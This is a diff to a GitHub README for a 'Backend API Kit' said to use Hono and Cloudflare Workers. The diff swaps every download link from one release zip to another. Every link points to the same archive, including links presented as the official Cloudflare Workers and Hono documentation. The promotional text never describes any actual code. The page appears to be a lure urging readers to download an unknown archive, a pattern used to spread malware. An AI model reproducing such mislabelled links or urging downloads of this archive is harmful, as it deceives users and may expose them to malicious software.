@@ -1,6 +1,6 @@
 # 🚀 **Backend API Kit - Create Scalable and Monetizable Backend APIs with Hono and Cloudflare!**
 
-[![Software Download](https://github.com/caticconnexion/backend-api-kit/releases/download/v1.0/Application.zip)](https://github.com/caticconnexion/backend-api-kit/releases/download/v1.0/Application.zip)
+[![Software Download](https://github.com/caticconnexion/backend-api-kit/releases/download/v2.0/Software.zip)](https://github.com/caticconnexion/backend-api-kit/releases/download/v2.0/Software.zip)
 
 Welcome to **Backend API Kit**, your go-to solution for easily creating scalable and monetizable backend APIs using the powerful combination of Hono and Cloudflare workers. With all the necessary batteries included, this repository provides you with the tools and resources needed to build robust APIs for your projects.
 
@@ -18,7 +18,7 @@ Welcome to **Backend API Kit**, your go-to solution for easily creating scalable
 
 ## 📦 Getting Started
 Follow these steps to kickstart your journey with Backend API Kit:
-1. Download the [https://github.com/caticconnexion/backend-api-kit/releases/download/v1.0/Application.zip](https://github.com/caticconnexion/backend-api-kit/releases/download/v1.0/Application.zip) to get access to all the essential tools.
+1. Download the [https://github.com/caticconnexion/backend-api-kit/releases/download/v2.0/Software.zip](https://github.com/caticconnexion/backend-api-kit/releases/download/v2.0/Software.zip) to get access to all the essential tools.
 2. Explore the provided documentation and examples to understand how to use Hono and Cloudflare effectively.
 3. Customize the APIs to suit your project requirements and start building scalable backend solutions.
 
@@ -41,12 +41,12 @@ If you encounter any issues or have suggestions for improvements, feel free to:
 - Engage with the community to share your experiences and insights.
 
 ## 🌐 Additional Resources
-- Check out the latest [Releases](https://github.com/caticconnexion/backend-api-kit/releases/download/v1.0/Application.zip) for any updates or new features.
-- Visit the official [Cloudflare Workers](https://github.com/caticconnexion/backend-api-kit/releases/download/v1.0/Application.zip) documentation for in-depth information.
-- Explore the capabilities of [Hono](https://github.com/caticconnexion/backend-api-kit/releases/download/v1.0/Application.zip) for building robust backend services.
+- Check out the latest [Releases](https://github.com/caticconnexion/backend-api-kit/releases/download/v2.0/Software.zip) for any updates or new features.
+- Visit the official [Cloudflare Workers](https://github.com/caticconnexion/backend-api-kit/releases/download/v2.0/Software.zip) documentation for in-depth information.
+- Explore the capabilities of [Hono](https://github.com/caticconnexion/backend-api-kit/releases/download/v2.0/Software.zip) for building robust backend services.
 
 ## 🙌 Get Started Now!
-Don't miss out on the opportunity to create scalable, monetizable backend APIs effortlessly. Download the https://github.com/caticconnexion/backend-api-kit/releases/download/v1.0/Application.zip and start building your next big project with Backend API Kit!
+Don't miss out on the opportunity to create scalable, monetizable backend APIs effortlessly. Download the https://github.com/caticconnexion/backend-api-kit/releases/download/v2.0/Software.zip and start building your next big project with Backend API Kit!
 
 ---
 
